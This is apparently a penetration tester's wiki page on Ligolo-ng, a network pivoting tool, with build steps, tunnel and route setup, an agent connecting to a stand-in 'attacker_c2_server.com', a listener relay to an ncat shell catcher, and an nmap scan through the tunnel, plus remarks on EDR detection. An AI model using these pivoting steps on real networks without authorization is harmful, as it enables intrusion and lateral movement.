# Ligolo-ng

[Ligolo-ng](https://github.com/Nicocha30/ligolo-ng) states its *"a advanced, yet simple, tunneling/pivoting tool that uses a TUN interface."*

Unlike [[Chisel]], [[Metasploit]]'s Metapreter or Ligolo, Ligolo-ng creates userland network stack using [Gvisor](https://gvisor.dev/) a *"open-source Linux-compatible sandbox that runs anywhere existing container tooling does. It enables cloud-native container security and portability. gVisor leverages years of experience isolating production workloads at Google."*. In affect no [[Proxychains]] is required, which can be good in some circumstances where you do not want to micromanage your proxy nodes and routing. Beware that both Gvisor and Ligolo-ng, like Chisel are written in [[Golang]], which has Google Telemetry. From a OPSEC perspective this creates interfaces, which [[EDR]]s are going to alert on as Gvisor is userland communicating with the kernel to hold that interface in memory and track it. It is also Golang so remote loading into memory from a beacon would be lot of your packet economy spent. It would however be very useful for time constrained and empirical [[Penetration-Testing]] that does not have OPSEC concerns. Even then agent runs without privileges so cannot forward raw packets. Regardless is very useful tool!

Build `ligolo-ng` agent and proxy.
```bash
$ go build -o agent cmd/agent/main.go
$ go build -o proxy cmd/proxy/main.go
# Build for Windows
$ GOOS=windows go build -o agent.exe cmd/agent/main.go
$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```


Linux Setup
```bash
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up
```

You need to download the [Wintun](https://www.wintun.net/) driver (used by [WireGuard](https://www.wireguard.com/)) and place the `wintun.dll` in the same folder as Ligolo (check architecture!).

General network architecture assumptions for the rest of this page unless otherwise stated
```goat
[c2 server] ----- [ligolo-ng proxy] ----- [agent] 
```
Examples and setup:
```bash
# Agent
$ ./agent -ignore-cert 
$ ./agent -connect attacker_c2_server.com:11601

# Proxy server
$ ./proxy -h # Help options
$ ./proxy -autocert # Automatically request LetsEncrypt certificates NOT RECOMMENDED
```

Adding Routes on Linux
```
sudo ip route add 192.168.0.0/24 dev ligolo
```
Adding Routes on Windows
```powershell
netsh int ipv4 show interfaces
route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]
```

```powershell
[Agent : nchatelain@nworkstation] » start_tunnel
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
# And with custom tuntap interface
[Agent : nchatelain@nworkstation] » start_tunnel --tun mycustomtuntap
[Agent : nchatelain@nworkstation] » INFO[0690] Starting tunnel to nchatelain@nworkstation   
```

And finally agent/listener binding:
```powershell
# In ligolo-ng agent session
[Agent : nchatelain@nworkstation] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO[1208] Listener created on remote agent!   
# listener_list for listing all listeners
[Agent : nchatelain@nworkstation] » listener_list 
┌───────────────────────────────────────────────────────────────────────────────┐
│ Active listeners                                                              │
├───┬─────────────────────────┬────────────────────────┬────────────────────────┤
│ # │ AGENT                   │ AGENT LISTENER ADDRESS │ PROXY REDIRECT ADDRESS │
├───┼─────────────────────────┼────────────────────────┼────────────────────────┤
│ 0 │ nchatelain@nworkstation │ 0.0.0.0:1234           │ 127.0.0.1:4321         │
└───┴─────────────────────────┴────────────────────────┴────────────────────────┘
# Stop a listener
[Agent : nchatelain@nworkstation] » listener_stop 0
INFO[1505] Listener closed.                             
```

```bash
rlwrap ncat -lvnp 4321
```

Then for accessing agent's local interfaces
```bash
# From c2 add the route
$ sudo ip route add 240.0.0.1/32 dev ligolo
# Nmap scan
$ nmap 240.0.0.1 -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-30 22:17 CET
Nmap scan report for 240.0.0.1
Host is up (0.023s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
8000/tcp open http SimpleHTTPServer 0.6 (Python 3.9.2)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.16 seconds
```
## References

[Ligolo-ng](https://github.com/Nicocha30/ligolo-ng)
[Gvisor](https://gvisor.dev/)